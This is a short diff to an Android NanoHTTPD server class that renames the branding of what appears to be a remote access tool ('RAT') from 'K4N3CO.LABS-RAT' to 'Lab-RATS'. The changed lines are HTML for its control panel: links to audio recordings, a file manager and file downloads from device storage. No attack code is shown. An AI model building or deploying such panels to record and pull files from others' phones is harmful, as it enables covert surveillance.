@@ -28,7 +28,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
             "<head>" +
             "<meta charset=\"UTF-8\">" +
             "<meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\">" +
-            "<title>K4N3CO.LABS-RAT</title>" +
+            "<title>Lab-RATS</title>" +
             "<style>" +
             "* { margin: 0; padding: 0; box-sizing: border-box; }" +
             "body {" +
@@ -104,7 +104,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
             "<div class=\"container\">" +
             "<div class=\"header\">" +
             "<img src=\"/logo\" alt=\"Logo\" style=\"width: 150px; height: auto; margin-bottom: 15px; border-radius: 10px;\">" +
-            "<h1>K4N3CO.LABS-RAT</h1>" +
+            "<h1>Lab-RATS</h1>" +
             "</div>" +
             "<div class=\"nav\">" +
             "<a href=\"/\">Home</a>" +
@@ -1650,7 +1650,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
         html += "<div class=\"card\">" +
                 "<h3 style=\"margin-bottom: 15px;\">&#128190; Saved Recordings</h3>" +
                 "<a href=\"/audio/recordings\" class=\"btn btn-primary\">View All Recordings</a>" +
-                "<a href=\"/files/Music/K4N3CORecordings\" class=\"btn btn-success\">Open in File Manager</a>" +
+                "<a href=\"/files/Music/LabRATSRecordings\" class=\"btn btn-success\">Open in File Manager</a>" +
                 "</div>";
 
         // Auto-refresh script for status
@@ -1799,7 +1799,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
 
         // Get recordings directory
         File recordDir = new File(Environment.getExternalStoragePublicDirectory(
-                Environment.DIRECTORY_MUSIC), "K4N3CORecordings");
+                Environment.DIRECTORY_MUSIC), "LabRATSRecordings");
 
         if (!recordDir.exists() || !recordDir.isDirectory()) {
             html.append("<div class=\"empty-state\"><div class=\"icon\">&#127897;</div><p>No recordings yet</p></div>");
@@ -1850,7 +1850,7 @@ public class K4N3COHttpServer extends NanoHTTPD {
                     html.append(new SimpleDateFormat("MMM dd, yyyy HH:mm", Locale.getDefault())
                             .format(new Date(file.lastModified())));
                     html.append("</div></div>");
-                    html.append("<a href=\"/download/Music/K4N3CORecordings/").append(fileName)
+                    html.append("<a href=\"/download/Music/LabRATSRecordings/").append(fileName)
                             .append("\" style=\"padding: 8px 16px; background: rgba(233, 69, 96, 0.2); border-radius: 8px; color: #e94560; text-decoration: none; font-size: 0.85rem;\">Download</a>");
                     html.append("</li>");
 
